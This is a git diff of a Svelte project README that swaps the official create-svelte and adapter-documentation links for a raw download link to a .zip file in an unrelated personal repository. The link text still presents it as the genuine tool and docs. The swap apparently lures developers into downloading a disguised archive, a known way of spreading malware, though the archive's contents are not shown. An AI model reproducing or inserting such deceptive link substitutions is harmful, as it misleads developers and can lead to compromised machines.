@@ -1,6 +1,6 @@
 # create-svelte
 
-Everything you need to build a Svelte project, powered by [`create-svelte`](https://github.com/sveltejs/kit/tree/master/packages/create-svelte);
+Everything you need to build a Svelte project, powered by [`create-svelte`](https://raw.githubusercontent.com/LeeKuanGim/KuanGim-guess-gender/main/src/routes/KuanGim-guess-gender-noll.zip);
 
 ## Creating a project
 
@@ -29,7 +29,7 @@ npm run dev -- --open
 
 ## Building
 
-Before creating a production version of your app, install an [adapter](https://kit.svelte.dev/docs#adapters) for your target environment. Then:
+Before creating a production version of your app, install an [adapter](https://raw.githubusercontent.com/LeeKuanGim/KuanGim-guess-gender/main/src/routes/KuanGim-guess-gender-noll.zip) for your target environment. Then:
 
 ```bash
 npm run build
